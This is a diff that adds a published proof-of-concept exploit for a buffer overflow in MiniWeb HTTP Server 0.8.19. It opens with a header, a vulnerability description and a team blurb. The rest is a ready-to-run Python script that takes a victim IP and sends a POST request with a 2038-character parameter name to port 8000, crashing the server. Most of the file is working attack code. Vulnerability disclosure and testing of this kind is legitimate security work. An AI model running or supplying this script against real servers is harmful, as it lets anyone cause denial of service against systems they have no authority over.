@@ -1,0 +1,55 @@
+# Exploit Title: MiniWeb HTTP Server 0.8.19 - Buffer Overflow (PoC)
+# Date: 13.12.2020
+# Exploit Author: securityforeveryone.com
+# Author Mail: hello[AT]securityforeveryone.com
+# Vendor Homepage: https://sourceforge.net/projects/miniweb/
+# Software Link: https://sourceforge.net/projects/miniweb/files/miniweb/0.8/miniweb-win32-20130309.zip/download
+# Version: 0.8.19
+# Tested on: Win7 x86
+# Researchers: Security For Everyone Team - https://securityforeveryone.com
+
+'''
+Description
+
+ MiniWeb HTTP server 0.8.19 allows remote attackers to cause a denial of service (daemon crash) via a long name for the
+ first parameter in a POST request.
+
+Exploitation
+
+ The vulnerability is the first parameter's name of the POST request. Example: PARAM_NAME1=param_data1&param_name2=param_data2
+ if we send a lot of "A" characters to "PARAM_NAME1", the miniweb server will crash.
+
+About Security For Everyone Team
+
+We are a team that has been working on cyber security in the industry for a long time. 
+In 2020, we created securityforeveyone.com where everyone can test their website security and get help to fix their vulnerabilities.
+We have many free tools that you can use here: https://securityforeveryone.com/free-tool-list
+
+'''
+
+#!/usr/bin/python
+
+import socket
+import sys
+import struct
+
+if len(sys.argv) != 2 :
+	print "[+] Usage : python exploit.py [VICTIM_IP]"
+	exit(0)
+
+TCP_IP = sys.argv[1]
+TCP_PORT = 8000
+
+xx = "A"*2038 #4085
+
+http_req = "POST /index.html HTTP/1.1\r\n"
+http_req += "Host: 192.168.231.140\r\n"
+http_req += "From: header-data\r\n"
+http_req += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+http_req += xx + "=param_data1&param_name2=param_data2"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+print "[+] Sending exploit payload..."
+s.send(http_req)
+s.close()
